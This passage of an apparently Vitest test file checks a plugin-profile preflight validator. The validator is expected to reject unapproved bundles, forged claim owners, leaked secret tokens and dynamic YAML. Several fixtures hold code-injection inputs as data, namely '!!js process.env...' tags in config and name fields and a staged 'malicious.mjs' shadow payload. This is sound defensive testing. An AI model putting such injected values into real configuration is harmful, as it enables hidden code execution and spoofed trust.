          candidateId: dsh-toolkit-copy
          profile: custom-curated
          active: true
          capability: deterministic-tools-copy
          resources:
            toolNames: [toolkit_read]
`
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: ['@deepseek-ai/dsh-toolkit'] } },
      }))
      stageCandidatePackage(profileRoot, '@deepseek-ai/dsh-toolkit', patch, {}, undefined, candidate)

      const result = commands.runPreflight(['--profile', 'custom-curated', '--json'], {
        profileRoot,
      })
      const payload = JSON.parse(result.stdout) as { entryCount: number; issues: Array<{ code: string }> }

      expect(result.status).toBe(1)
      expect(payload.entryCount).toBe(2)
      expect(payload.issues).toContainEqual(expect.objectContaining({
        code: 'preflight-tool-name-duplicate',
      }))
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it.each([
    { name: 'inactive', active: false, targetProfiles: ['web-curated'] },
    { name: 'unassigned', active: true, targetProfiles: ['web-research'] },
  ])('rejects an installed $name catalog bundle without patch metadata', async ({ active, targetProfiles }) => {
    const candidate = artifactCandidate({
      id: 'unapproved-provider',
      expectedPackage: 'unapproved-provider',
      active,
      targetProfiles,
    })
    vi.resetModules()
    vi.doMock('@deepseek-ai/dsh-curated-policy', async () => {
      const actual = await vi.importActual<typeof import('@deepseek-ai/dsh-curated-policy')>(
        '@deepseek-ai/dsh-curated-policy',
      )
      return {
        ...actual,
        loadCuratedCatalog: () => ({
          schemaVersion: 1,
          source: actual.loadCuratedCatalog().source,
          candidates: [candidate],
        }),
      }
    })
    const commands = await import('../src/index.ts')
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-unapproved-'))
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: ['unapproved-provider'] } },
      }))
      stageCandidatePackage(
        profileRoot,
        'unapproved-provider',
        '- insert:\n    - id: unapproved-provider\n      name: ./plugin.mjs\n',
      )

      const result = commands.runPreflight(['--profile', 'web-curated', '--json'], {
        profileRoot,
        artifactRoots: [profileRoot],
      })
      const payload = JSON.parse(result.stdout) as {
        observed: boolean
        accepted: boolean
        issues: Array<{ code: string; target?: string }>
      }

      expect(result.status).toBe(1)
      expect(payload).toMatchObject({
        observed: true,
        accepted: false,
      })
      expect(payload.issues).toContainEqual(expect.objectContaining({
        code: 'preflight-bundle-not-approved',
        target: 'unapproved-provider',
      }))
      expect(payload.issues).toContainEqual(expect.objectContaining({
        code: 'preflight-profile-template-mismatch',
        target: 'web-curated',
      }))
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('derives observed providers from catalog-owned bundle assignments without curated patch metadata', async () => {
    const first = artifactCandidate({
      id: 'provider-a',
      expectedPackage: 'provider-a',
      capability: 'web-search',
      targetProfiles: ['web-curated'],
      resources: { entryIds: ['provider-a-entry'], toolNames: ['shared-search'] },
    })
    const second = artifactCandidate({
      id: 'provider-b',
      expectedPackage: 'provider-b',
      capability: 'web-search',
      targetProfiles: ['web-curated'],
      resources: { entryIds: ['provider-b-entry'], toolNames: ['shared-search'] },
    })
    vi.resetModules()
    vi.doMock('@deepseek-ai/dsh-curated-policy', async () => {
      const actual = await vi.importActual<typeof import('@deepseek-ai/dsh-curated-policy')>(
        '@deepseek-ai/dsh-curated-policy',
      )
      return {
        ...actual,
        loadCuratedCatalog: () => ({
          schemaVersion: 1,
          source: actual.loadCuratedCatalog().source,
          candidates: [first, second],
        }),
      }
    })
    const commands = await import('../src/index.ts')
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-catalog-providers-'))
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: ['provider-a', 'provider-b'] } },
      }))
      stageCandidatePackage(
        profileRoot,
        'provider-a',
        '- insert:\n    - id: provider-a-entry\n      name: ./plugin.mjs\n',
        {},
        undefined,
        first,
      )
      stageCandidatePackage(
        profileRoot,
        'provider-b',
        '- insert:\n    - id: provider-b-entry\n      name: ./plugin.mjs\n',
        {},
        undefined,
        second,
      )

      const result = commands.runPreflight(['--profile', 'web-curated', '--json'], {
        profileRoot,
        artifactRoots: [profileRoot],
      })
      const payload = JSON.parse(result.stdout) as { issues: Array<{ code: string; message: string }> }

      expect(result.status).toBe(1)
      expect(payload.issues).toContainEqual(expect.objectContaining({
        code: 'preflight-provider-duplicate',
      }))
      expect(payload.issues).toContainEqual(expect.objectContaining({
        code: 'preflight-tool-name-duplicate',
      }))
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('accepts a catalog-owned bundle with no entries or optional resource claims', async () => {
    const candidate = artifactCandidate({
      id: 'resource-free-provider',
      expectedPackage: 'resource-free-provider',
      capability: 'resource-free-capability',
      targetProfiles: ['custom-curated'],
      resources: undefined,
    })
    vi.resetModules()
    vi.doMock('@deepseek-ai/dsh-curated-policy', async () => {
      const actual = await vi.importActual<typeof import('@deepseek-ai/dsh-curated-policy')>(
        '@deepseek-ai/dsh-curated-policy',
      )
      return {
        ...actual,
        loadCuratedCatalog: () => ({
          schemaVersion: 1,
          source: actual.loadCuratedCatalog().source,
          candidates: [candidate],
        }),
      }
    })
    const commands = await import('../src/index.ts')
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-resource-free-'))
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: ['resource-free-provider'] } },
      }))
      stageCandidatePackage(
        profileRoot,
        'resource-free-provider',
        '[]\n',
        {},
        undefined,
        candidate,
      )

      const result = commands.runPreflight(['--profile', 'custom-curated', '--json'], {
        profileRoot,
        artifactRoots: [profileRoot],
      })

      expect(result.status).toBe(0)
      expect(JSON.parse(result.stdout)).toMatchObject({
        observed: true,
        accepted: true,
        issues: [],
      })
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it.each([
    {
      name: 'top-level inserted scalar',
      patch: '- insert:\n    - malformed\n',
      expectedMessage: 'must be a mapping',
    },
    {
      name: 'nested group scalar',
      patch: `- insert:
    - id: fixture-group
      name: '@deepseek-ai/cordis-plugin-group'
      group: true
      config:
        - malformed
`,
      expectedMessage: 'must be a mapping',
    },
    {
      name: 'non-list insert',
      patch: '- insert: malformed\n',
      expectedMessage: 'must be an entry list',
    },
  ])('rejects a $name in an observed bundle patch', ({ expectedMessage, patch }) => {
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-non-record-entry-'))
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: ['fixture-local-bundle'] } },
      }))
      stageCandidatePackage(profileRoot, 'fixture-local-bundle', patch)

      const result = runPreflight(['--profile', 'custom-curated', '--json'], {
        profileRoot,
        artifactRoots: [profileRoot],
      })

      expect(result.status).toBe(1)
      const payload = JSON.parse(result.stdout) as {
        command: string
        ok: boolean
        issues: Array<{ code: string; message: string }>
      }
      expect(payload).toMatchObject({
        command: 'preflight',
        ok: false,
        issues: [{
          code: 'preflight-input-invalid',
        }],
      })
      expect(payload.issues[0]?.message).toContain(expectedMessage)
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('rejects an idless entry from a profile-local bundle', () => {
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-idless-owned-entry-'))
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: ['fixture-local-bundle'] } },
      }))
      stageCandidatePackage(
        profileRoot,
        'fixture-local-bundle',
        '- insert:\n    - name: ./plugin.mjs\n',
      )

      const result = runPreflight(['--profile', 'custom-curated', '--json'], {
        profileRoot,
        artifactRoots: [profileRoot],
      })
      const payload = JSON.parse(result.stdout) as {
        command: string
        ok: boolean
        issues: Array<{ code: string; message: string }>
      }

      expect(result.status).toBe(1)
      expect(payload).toMatchObject({
        command: 'preflight',
        ok: false,
        issues: [{
          code: 'preflight-input-invalid',
        }],
      })
      expect(payload.issues[0]?.message).toContain('id must be a non-empty string')
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it.each([
    {
      name: 'immediate',
      bundlePatch: `- insert:
    - id: fixture-group
      name: '@deepseek-ai/cordis-plugin-group'
      group: true
      config:
        - id: valid-child
          name: ./plugin.mjs
`,
      target: 'fixture-group',
      config: '    - malformed',
      expectedMessage: 'must be a mapping',
    },
    {
      name: 'deeply nested',
      bundlePatch: `- insert:
    - id: outer-group
      name: '@deepseek-ai/cordis-plugin-group'
      group: true
      config:
        - id: fixture-group
          name: '@deepseek-ai/cordis-plugin-group'
          group: true
          config:
            - id: valid-child
              name: ./plugin.mjs
`,
      target: 'fixture-group',
      config: '    - malformed',
      expectedMessage: 'must be a mapping',
    },
    {
      name: 'non-list',
      bundlePatch: `- insert:
    - id: fixture-group
      name: '@deepseek-ai/cordis-plugin-group'
      group: true
      config:
        - id: valid-child
          name: ./plugin.mjs
`,
      target: 'fixture-group',
      config: '    malformed',
      expectedMessage: 'config must be an entry list',
    },
  ])('rejects a non-record child from an $name config-only group override', ({
    bundlePatch,
    config,
    expectedMessage,
    target,
  }) => {
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-non-record-override-'))
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: ['fixture-local-bundle'] } },
      }))
      stageCandidatePackage(profileRoot, 'fixture-local-bundle', bundlePatch)
      writeFileSync(join(profileRoot, 'cordis.patch.yml'), `- id: ${target}
  config:
${config}
`)

      const result = runPreflight(['--profile', 'custom-curated', '--json'], {
        profileRoot,
        artifactRoots: [profileRoot],
      })
      const payload = JSON.parse(result.stdout) as {
        command: string
        ok: boolean
        issues: Array<{ code: string; message: string }>
      }

      expect(result.status).toBe(1)
      expect(payload).toMatchObject({
        command: 'preflight',
        ok: false,
        issues: [{
          code: 'preflight-input-invalid',
        }],
      })
      expect(payload.issues[0]?.message).toContain(expectedMessage)
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('merges catalog and patch claims for the same candidate without self-conflicts', async () => {
    const candidate = artifactCandidate({
      id: 'dsh-web-search-pro',
      expectedPackage: 'catalog-search',
      capability: 'web-search',
      targetProfiles: ['custom-curated'],
      resources: { entryIds: ['catalog-search'], toolNames: ['shared-search'] },
    })
    vi.resetModules()
    vi.doMock('@deepseek-ai/dsh-curated-policy', async () => {
      const actual = await vi.importActual<typeof import('@deepseek-ai/dsh-curated-policy')>(
        '@deepseek-ai/dsh-curated-policy',
      )
      return {
        ...actual,
        loadCuratedCatalog: () => ({
          schemaVersion: 1,
          source: actual.loadCuratedCatalog().source,
          candidates: [candidate],
        }),
      }
    })
    const commands = await import('../src/index.ts')
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-merged-claims-'))
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: ['catalog-search'] } },
      }))
      stageCandidatePackage(profileRoot, 'catalog-search', `- insert:
    - id: catalog-search
      name: ./plugin.mjs
      config:
        curated:
          candidateId: dsh-web-search-pro
          profile: custom-curated
          active: true
          capability: web-search
          resources:
            toolNames: [shared-search]
`, {}, undefined, candidate)

      const result = commands.runPreflight(['--profile', 'custom-curated', '--json'], {
        profileRoot,
        artifactRoots: [profileRoot],
      })

      expect(result.status).toBe(0)
      expect(JSON.parse(result.stdout)).toMatchObject({
        observed: true,
        accepted: true,
        issues: [],
      })
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('does not let an ID-only profile override forge a catalog claim owner', async () => {
    const candidate = artifactCandidate({
      id: 'dsh-web-search-pro',
      expectedPackage: 'catalog-search',
      capability: 'web-search',
      targetProfiles: ['custom-curated'],
      resources: {
        entryIds: ['catalog-search'],
        toolNames: ['shared-search'],
      },
    })
    vi.resetModules()
    vi.doMock('@deepseek-ai/dsh-curated-policy', async () => {
      const actual = await vi.importActual<typeof import('@deepseek-ai/dsh-curated-policy')>(
        '@deepseek-ai/dsh-curated-policy',
      )
      return {
        ...actual,
        loadCuratedCatalog: () => ({
          schemaVersion: 1,
          source: actual.loadCuratedCatalog().source,
          candidates: [candidate],
        }),
      }
    })
    const commands = await import('../src/index.ts')
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-override-owner-spoof-'))
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: ['catalog-search'] } },
      }))
      stageCandidatePackage(profileRoot, 'catalog-search', `- insert:
    - id: catalog-search
      name: ./plugin.mjs
      config:
        curated:
          candidateId: dsh-web-search-pro
          profile: custom-curated
          active: true
          capability: web-search
          resources:
            toolNames: [shared-search]
`, {}, undefined, candidate)
      writeFileSync(join(profileRoot, 'cordis.patch.yml'), `- id: catalog-search
  __dshCuratedClaimOwner:
    id: bundle:forged
    label: forged
`)

      const result = commands.runPreflight(['--profile', 'custom-curated', '--json'], {
        profileRoot,
        artifactRoots: [profileRoot],
      })

      expect(result.status).toBe(0)
      expect(JSON.parse(result.stdout)).toMatchObject({
        observed: true,
        accepted: true,
        issues: [],
      })
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('does not let a profile insert forge a catalog claim owner', async () => {
    const candidate = artifactCandidate({
      id: 'dsh-web-search-pro',
      expectedPackage: 'catalog-search',
      capability: 'web-search',
      targetProfiles: ['custom-curated'],
      resources: { entryIds: ['catalog-search'], toolNames: ['shared-search'] },
    })
    vi.resetModules()
    vi.doMock('@deepseek-ai/dsh-curated-policy', async () => {
      const actual = await vi.importActual<typeof import('@deepseek-ai/dsh-curated-policy')>(
        '@deepseek-ai/dsh-curated-policy',
      )
      return {
        ...actual,
        loadCuratedCatalog: () => ({
          schemaVersion: 1,
          source: actual.loadCuratedCatalog().source,
          candidates: [candidate],
        }),
      }
    })
    const commands = await import('../src/index.ts')
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-insert-owner-spoof-'))
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: ['catalog-search'] } },
      }))
      stageCandidatePackage(
        profileRoot,
        'catalog-search',
        '- insert:\n    - id: catalog-search\n      name: ./plugin.mjs\n',
        {},
        undefined,
        candidate,
      )
      writeFileSync(join(profileRoot, 'cordis.patch.yml'), `- insert:
    - id: local-search
      name: ./local.mjs
      config:
        curated:
          candidateId: dsh-web-search-pro
          profile: custom-curated
          active: true
          capability: web-search
          resources:
            toolNames: [shared-search]
- id: local-search
  __dshCuratedClaimOwner:
    id: catalog:dsh-web-search-pro
    label: dsh-web-search-pro
    catalogCandidateId: dsh-web-search-pro
`)

      const result = commands.runPreflight(['--profile', 'custom-curated', '--json'], {
        profileRoot,
        artifactRoots: [profileRoot],
      })
      const payload = JSON.parse(result.stdout) as { issues: Array<{ code: string; target?: string }> }

      expect(result.status).toBe(1)
      expect(payload.issues).toContainEqual(expect.objectContaining({
        code: 'preflight-provider-duplicate',
        target: 'profile patch',
      }))
      expect(payload.issues).toContainEqual(expect.objectContaining({
        code: 'preflight-tool-name-duplicate',
        target: 'profile patch',
      }))
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it.each(['profile', 'home', 'overlay', 'overlay-equals'] as const)(
    'rejects an unattributed executable entry inserted by the %s layer',
    (layer) => {
      const home = mkdtempSync(join(tmpdir(), 'dsh-curated-unattributed-entry-'))
      const profileRoot = join(home, 'profiles', 'custom-curated')
      const overlayPath = join(home, 'overlay.yml')
      mkdirSync(profileRoot, { recursive: true })
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: ['@deepseek-ai/dsh-curated-base'] } },
      }))
      writeFileSync(join(profileRoot, 'cordis.patch.yml'), '[]\n')
      const patch = '- insert:\n    - id: local-code\n      name: ./local-code.mjs\n'
      if (layer === 'profile') writeFileSync(join(profileRoot, 'cordis.patch.yml'), patch)
      if (layer === 'home') writeFileSync(join(home, 'cordis.patch.yml'), patch)
      if (layer.startsWith('overlay')) writeFileSync(overlayPath, patch)
      try {
        const result = runPreflight([
          '--profile',
          'custom-curated',
          '--profile-root',
          profileRoot,
          ...layer === 'overlay'
            ? ['--patch', overlayPath]
            : layer === 'overlay-equals' ? [`--patch=${overlayPath}`] : [],
          '--json',
        ])
        const payload = JSON.parse(result.stdout) as {
          accepted: boolean
          issues: Array<{ code: string; target?: string }>
        }

        expect(result.status).toBe(1)
        expect(payload.accepted).toBe(false)
        expect(payload.issues).toContainEqual(expect.objectContaining({
          code: 'preflight-entry-owner-unapproved',
          target: 'local-code',
        }))
      } finally {
        rmSync(home, { recursive: true, force: true })
      }
    },
  )

  it.each(['home', 'overlay', 'overlay-equals'] as const)(
    'rejects secret material in a discarded raw %s patch',
    (layer) => {
      const home = mkdtempSync(join(tmpdir(), 'dsh-curated-raw-patch-secret-'))
      const profileRoot = join(home, 'profiles', 'custom-curated')
      const overlayPath = join(home, 'overlay.yml')
      const secret = `plain-${layer}-secret`
      mkdirSync(profileRoot, { recursive: true })
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        name: 'dsh-profile-custom-curated',
        dsh: { profile: { bundles: ['@deepseek-ai/dsh-curated-base'] } },
      }))
      writeFileSync(join(profileRoot, 'cordis.patch.yml'), '[]\n')
      const patch = `- id: missing-entry\n  config:\n    token: ${secret}\n`
      if (layer === 'home') writeFileSync(join(home, 'cordis.patch.yml'), patch)
      else writeFileSync(overlayPath, patch)
      try {
        const result = runPreflight([
          '--profile',
          'custom-curated',
          '--profile-root',
          profileRoot,
          ...layer === 'overlay'
            ? ['--patch', overlayPath]
            : layer === 'overlay-equals' ? [`--patch=${overlayPath}`] : [],
          '--json',
        ])
        const payload = JSON.parse(result.stdout) as {
          accepted: boolean
          issues: Array<{ code: string }>
        }

        expect(result.status).toBe(1)
        expect(payload.accepted).toBe(false)
        expect(payload.issues).toContainEqual(expect.objectContaining({
          code: layer === 'home' ? 'preflight-home-patch-secret' : 'preflight-overlay-patch-secret',
        }))
        expect(result.stdout).not.toContain(secret)
      } finally {
        rmSync(home, { recursive: true, force: true })
      }
    },
  )

  it('rejects an explicitly disabled unattributed fallback entry', () => {
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-inactive-fallback-'))
    const profileRoot = join(home, 'profiles', 'custom-curated')
    mkdirSync(profileRoot, { recursive: true })
    writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
      name: 'dsh-profile-custom-curated',
      dsh: { profile: { bundles: ['@deepseek-ai/dsh-curated-base'] } },
    }))
    writeFileSync(join(profileRoot, 'cordis.patch.yml'), `- insert:
    - id: local-fallback
      name: ./local-fallback.mjs
      disabled: true
`)
    try {
      const result = runPreflight([
        '--profile',
        'custom-curated',
        '--profile-root',
        profileRoot,
        '--json',
      ])

      expect(result.status, result.stdout).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        observed: true,
        accepted: false,
        issues: [{
          code: 'preflight-entry-owner-unapproved',
          target: 'local-fallback',
        }],
      })
    } finally {
      rmSync(home, { recursive: true, force: true })
    }
  })

  it.each([
    {
      layer: 'profile',
      patch: `- id: shipped-entry
  config:
    value: !!js process.env.DSH_UNTRUSTED_PROFILE_EXPRESSION
`,
    },
    {
      layer: 'home',
      patch: `- id: shipped-group
  config:
    - id: shipped-entry
      name: ./plugin.mjs
      disabled: !!js process.env.DSH_UNTRUSTED_HOME_EXPRESSION
`,
    },
    {
      layer: 'overlay',
      patch: `- id: shipped-group
  config:
    - id: shipped-entry
      name: ./plugin.mjs
      config:
        value: !!js process.env.DSH_UNTRUSTED_OVERLAY_EXPRESSION
`,
    },
    {
      layer: 'profile',
      patch: `- id: shipped-entry
  name: !!js process.env.DSH_UNTRUSTED_PLUGIN_NAME
`,
    },
  ] as const)('rejects dynamic YAML tags in a direct or nested $layer override', ({ layer, patch }) => {
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-dynamic-yaml-'))
    const profileRoot = join(home, 'profiles', 'custom-curated')
    const overlayPath = join(home, 'overlay.yml')
    mkdirSync(profileRoot, { recursive: true })
    writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
      dsh: { profile: { bundles: ['@deepseek-ai/dsh-base'] } },
    }))
    writeFileSync(join(profileRoot, 'cordis.patch.yml'), layer === 'profile' ? patch : '[]\n')
    if (layer === 'home') writeFileSync(join(home, 'cordis.patch.yml'), patch)
    if (layer === 'overlay') writeFileSync(overlayPath, patch)
    try {
      const result = runPreflight([
        '--profile',
        'custom-curated',
        '--profile-root',
        profileRoot,
        ...layer === 'overlay' ? ['--patch', overlayPath] : [],
        '--json',
      ])

      expect(result.status).toBe(1)
      expect(commandIssues(result)).toHaveLength(1)
      expect(commandIssues(result)[0]?.code).toBe('preflight-input-invalid')
      expect(commandIssues(result)[0]?.message).toContain('must not contain dynamic YAML tags')
      expect(result.stdout).not.toContain('DSH_UNTRUSTED')
    } finally {
      rmSync(home, { recursive: true, force: true })
    }
  })

  it('allows repository-approved dynamic YAML in an installation-owned bundle', () => {
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-trusted-dynamic-yaml-'))
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        name: 'dsh-profile-custom-curated',
        dsh: { profile: { bundles: ['@deepseek-ai/dsh-base'] } },
      }))

      const result = runPreflight(['--profile', 'custom-curated', '--json'], {
        profileRoot,
      })

      expect(result.status, result.stdout).toBe(0)
      expect((JSON.parse(result.stdout) as { entryCount: number }).entryCount).toBeGreaterThan(1)
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('allows dynamic YAML declared by an approved catalog bundle', async () => {
    const candidate = artifactCandidate({
      id: 'catalog-plugin',
      expectedPackage: 'catalog-plugin',
      capability: 'catalog-capability',
      targetProfiles: ['custom-curated'],
      resources: { entryIds: ['catalog-entry'] },
    })
    vi.resetModules()
    vi.doMock('@deepseek-ai/dsh-curated-policy', async () => {
      const actual = await vi.importActual<typeof import('@deepseek-ai/dsh-curated-policy')>(
        '@deepseek-ai/dsh-curated-policy',
      )
      return {
        ...actual,
        loadCuratedCatalog: () => ({
          schemaVersion: 1,
          source: actual.loadCuratedCatalog().source,
          candidates: [candidate],
        }),
      }
    })
    const commands = await import('../src/index.ts')
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-trusted-catalog-dynamic-yaml-'))
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: ['catalog-plugin'] } },
      }))
      stageCandidatePackage(profileRoot, 'catalog-plugin', `- insert:
    - id: catalog-entry
      name: ./plugin.mjs
      config:
        value: !!js process.platform
`, {}, undefined, candidate)

      const result = commands.runPreflight(['--profile', 'custom-curated', '--json'], {
        profileRoot,
        artifactRoots: [profileRoot],
      })

      expect(result.status, result.stdout).toBe(0)
      expect(JSON.parse(result.stdout)).toMatchObject({
        observed: true,
        accepted: true,
        issues: [],
      })
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('composes installation-owned bundles only from the canonical installation anchor', () => {
    const controlRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-installation-bundle-control-'))
    const shadowedRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-shadowed-installation-bundle-'))
    try {
      for (const root of [controlRoot, shadowedRoot]) {
        writeFileSync(join(root, 'package.json'), JSON.stringify({
          name: 'dsh-profile-custom-curated',
          dsh: { profile: { bundles: ['@deepseek-ai/dsh-base'] } },
        }))
      }
      stageCandidatePackage(shadowedRoot, '@deepseek-ai/dsh-base', `- insert:
    - id: profile-local-shadow
      name: ./malicious.mjs
      config:
        payload: !!js process.env.DSH_PROFILE_LOCAL_SHADOW
`)

      const control = runPreflight(['--profile', 'custom-curated', '--json'], {
        profileRoot: controlRoot,
      })
      const shadowed = runPreflight(['--profile', 'custom-curated', '--json'], {
        profileRoot: shadowedRoot,
      })

      expect(control.status, control.stdout).toBe(0)
      expect(shadowed.status, shadowed.stdout).toBe(0)
      expect(JSON.parse(shadowed.stdout)).toEqual(JSON.parse(control.stdout))
      expect(shadowed.stdout).not.toContain('profile-local-shadow')
    } finally {
      rmSync(controlRoot, { recursive: true, force: true })
      rmSync(shadowedRoot, { recursive: true, force: true })
    }
  })

  it.each([
    {
      name: 'extra',
      expectedCode: 'artifact-entry-ids-mismatch',
      patch: `- insert:
    - id: catalog-entry
      name: ./plugin.mjs
    - id: undisclosed-entry
      name: ./plugin.mjs
`,
    },
    {
      name: 'missing',
      expectedCode: 'artifact-entry-ids-mismatch',
      patch: '[]\n',
    },
    {
      name: 'substituted',
      expectedCode: 'artifact-entry-ids-mismatch',
      patch: `- insert:
    - id: substituted-entry
      name: ./plugin.mjs
`,
    },
    {
      name: 'idless',
      expectedCode: 'artifact-entry-invalid',
      patch: `- insert:
    - name: ./plugin.mjs
`,
    },
    {
      name: 'duplicate',
      expectedCode: 'artifact-entry-ids-mismatch',
      patch: `- insert:
    - id: catalog-entry
      name: ./plugin.mjs
    - id: catalog-entry
      name: ./plugin.mjs
`,
    },
  ])('rejects $name effective bundle entry IDs that differ from the catalog', async ({
    expectedCode,
    patch,
  }) => {
    const candidate = artifactCandidate({
      id: 'catalog-plugin',
      expectedPackage: 'catalog-plugin',
      capability: 'catalog-capability',
      targetProfiles: ['custom-curated'],
      resources: { entryIds: ['catalog-entry'] },
    })
    vi.resetModules()
    vi.doMock('@deepseek-ai/dsh-curated-policy', async () => {
      const actual = await vi.importActual<typeof import('@deepseek-ai/dsh-curated-policy')>(
        '@deepseek-ai/dsh-curated-policy',
      )
      return {
        ...actual,
        loadCuratedCatalog: () => ({
          schemaVersion: 1,
          source: actual.loadCuratedCatalog().source,
          candidates: [candidate],
        }),
      }
    })
    const commands = await import('../src/index.ts')
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-entry-ids-'))
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: ['catalog-plugin'] } },
      }))
      stageCandidatePackage(profileRoot, 'catalog-plugin', patch, {}, undefined, candidate)

      const result = commands.runPreflight(['--profile', 'custom-curated', '--json'], {
        profileRoot,
        artifactRoots: [profileRoot],
      })

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        observed: true,
        accepted: false,
        issues: [{
          code: expectedCode,
          target: 'catalog-plugin',
        }],
      })
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it.each([
    {
      name: 'missing top-level plugin name',
      expectedEntryIds: ['catalog-entry'],
      patch: `- insert:
    - id: catalog-entry
`,
    },
    {
      name: 'non-string top-level plugin name',
      expectedEntryIds: ['catalog-entry'],
      patch: `- insert:
    - id: catalog-entry
      name: 42
`,
    },
    {
      name: 'empty top-level plugin name',
      expectedEntryIds: ['catalog-entry'],
      patch: `- insert:
    - id: catalog-entry
      name: ''
`,
    },
    {
      name: 'missing group content',
      expectedEntryIds: ['catalog-group'],
      inputError: true,
      patch: `- insert:
    - id: catalog-group
      name: '@deepseek-ai/cordis-plugin-group'
      group: true
`,
    },
    {
      name: 'missing nested plugin name',
      expectedEntryIds: ['catalog-group', 'catalog-entry'],
      patch: `- insert:
    - id: catalog-group
      name: '@deepseek-ai/cordis-plugin-group'
      group: true
      config:
        - id: catalog-entry
`,
    },
    {
      name: 'non-string nested plugin name',
      expectedEntryIds: ['catalog-group', 'catalog-entry'],
      patch: `- insert:
    - id: catalog-group
      name: '@deepseek-ai/cordis-plugin-group'
      group: true
      config:
        - id: catalog-entry
          name: 42
`,
    },
  ])('rejects $name before comparing effective bundle entry IDs', async ({
    expectedEntryIds,
    inputError,
    patch,
  }) => {
    const candidate = artifactCandidate({
      id: 'catalog-plugin',
      expectedPackage: 'catalog-plugin',
      capability: 'catalog-capability',
      targetProfiles: ['custom-curated'],
      resources: { entryIds: expectedEntryIds },
    })
    vi.resetModules()
    vi.doMock('@deepseek-ai/dsh-curated-policy', async () => {
      const actual = await vi.importActual<typeof import('@deepseek-ai/dsh-curated-policy')>(
        '@deepseek-ai/dsh-curated-policy',
      )
      return {
        ...actual,
        loadCuratedCatalog: () => ({
          schemaVersion: 1,
          source: actual.loadCuratedCatalog().source,
          candidates: [candidate],
        }),
      }
    })
    const commands = await import('../src/index.ts')
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-entry-shape-'))
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: ['catalog-plugin'] } },
      }))
      stageCandidatePackage(profileRoot, 'catalog-plugin', patch, {}, undefined, candidate)

      const result = commands.runPreflight(['--profile', 'custom-curated', '--json'], {
        profileRoot,
        artifactRoots: [profileRoot],
      })

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject(inputError === true
        ? {
          issues: [{ code: 'preflight-input-invalid' }],
        }
        : {
          observed: true,
          accepted: false,
          issues: [{
            code: 'artifact-entry-invalid',
            target: 'catalog-plugin',
          }],
        })
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('accepts complete disabled, grouped, and overridden effective bundle entries', async () => {
    const candidate = artifactCandidate({
      id: 'catalog-plugin',
      expectedPackage: 'catalog-plugin',
      capability: 'catalog-capability',
      targetProfiles: ['custom-curated'],
      resources: { entryIds: ['catalog-disabled', 'catalog-group', 'catalog-entry'] },
    })
    vi.resetModules()
    vi.doMock('@deepseek-ai/dsh-curated-policy', async () => {
      const actual = await vi.importActual<typeof import('@deepseek-ai/dsh-curated-policy')>(
        '@deepseek-ai/dsh-curated-policy',
      )
      return {
        ...actual,
        loadCuratedCatalog: () => ({
          schemaVersion: 1,
